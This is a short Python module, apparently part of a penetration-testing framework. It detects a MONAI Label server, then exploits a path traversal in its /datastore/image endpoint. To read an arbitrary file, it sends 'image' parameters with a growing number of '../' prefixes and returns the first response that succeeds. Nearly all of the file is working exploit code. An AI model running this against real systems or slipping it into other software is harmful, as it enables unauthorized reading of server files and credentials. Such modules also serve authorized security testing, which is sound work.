#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MONAI Label HTTP helpers."""

from __future__ import annotations

from typing import Optional

from core.framework.base_module import BaseModule
from lib.protocols.http.path_traversal import Path_traversal


class Monai_label(Path_traversal, BaseModule):
    """Path traversal on /datastore/image."""

    def monai_detected(self) -> bool:
        for path in ("/info/", "/"):
            resp = self.http_request("GET", path, timeout=12)
            if not resp:
                continue
            body = (resp.text or "").lower()
            if "monai" in body or (path == "/info/" and "version" in body):
                return True
        return False

    def monai_traverse_read(
        self,
        target_path: str,
        max_depth: int = 8,
    ) -> Optional[dict]:
        rel = str(target_path or "").lstrip("/")
        if not rel:
            return None
        for depth in range(1, max(1, int(max_depth)) + 1):
            trav = ("../" * depth) + rel
            resp = self.http_request(
                "GET",
                "/datastore/image",
                params={"image": trav},
                timeout=20,
            )
            if not resp:
                continue
            code = int(resp.status_code or 0)
            content = resp.content or b""
            if code == 200 and content:
                return {
                    "depth": depth,
                    "payload": trav,
                    "body": (resp.text or "")[:2000],
                }
        return None